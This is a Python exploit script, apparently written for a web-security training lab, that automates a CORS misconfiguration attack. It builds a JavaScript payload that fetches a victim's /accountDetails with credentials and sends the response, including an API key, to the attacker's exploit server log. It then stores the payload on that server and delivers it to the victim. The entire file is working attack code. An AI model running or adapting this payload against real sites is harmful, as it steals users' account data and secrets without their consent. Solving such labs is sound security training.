import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def crafting_the_exploit(url):
    # some parts must be url encoded
    params = "urlIsHttps=on&responseFile=/exploit&responseHead=" + urllib.parse.quote("""HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""") + "&responseBody=" + urllib.parse.quote(""""<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','$url/accountDetails',true);
    req.withCredentials = true;
    req.send();
    
    function reqListener() {
        location='/log?key='+this.responseText;
    };
    
</script>
""".replace('$url', url)) + "&formAction=$Action"
    return params

def storing_the_exploit(exploit_server_url, params):
    params = params.replace('$Action',"STORE")
    r = requests.post(exploit_server_url, data=params, verify=False, proxies=proxies,
                      headers={"Content-Type": "application/x-www-form-urlencoded"})


def deliver_exploit_to_the_victim(exploit_server_url, params):
    params = params.replace('$Action',"DELIVER_TO_VICTIM")
    r = requests.post(exploit_server_url, data=params, verify=False, proxies=proxies,
                      headers={"Content-Type": "application/x-www-form-urlencoded"})

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    exploit_server_url = sys.argv[2]
    print("Crafting the exploit")
    params = crafting_the_exploit(url)
    storing_the_exploit(exploit_server_url, params)
    deliver_exploit_to_the_victim(exploit_server_url, params)
    #to do
    #read the api key from the logs
    #submit it to solve the lab


if __name__ == "__main__":
    main()
